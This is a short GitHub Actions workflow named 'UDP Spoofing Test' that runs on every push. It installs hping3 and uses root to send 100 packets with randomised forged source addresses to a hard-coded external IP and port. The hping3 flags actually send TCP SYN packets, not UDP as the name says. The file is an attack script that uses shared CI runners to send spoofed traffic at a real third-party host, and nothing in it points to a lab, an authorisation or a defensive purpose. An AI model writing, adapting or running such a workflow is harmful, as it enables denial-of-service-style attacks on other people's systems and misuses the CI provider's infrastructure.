name: UDP Spoofing Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y hping3
      - name: Send spoofed UDP packets
        run: |
          echo "Starting UDP spoofing test to 45.131.64.160:19081"
          
          # Send spoofed packets with root
          for i in {1..100}; do
            spoofed_ip=$(shuf -i 10-254 -n 1).$(shuf -i 10-254 -n 1).$(shuf -i 10-254 -n 1).$(shuf -i 10-254 -n 1)
            echo "Sending packet from $spoofed_ip"
            sudo hping3 -c 1 -S -p 19081 --spoof $spoofed_ip 45.131.64.160 2>/dev/null || true
            sleep 0.1
          done
          
          echo "Spoofing test completed!"
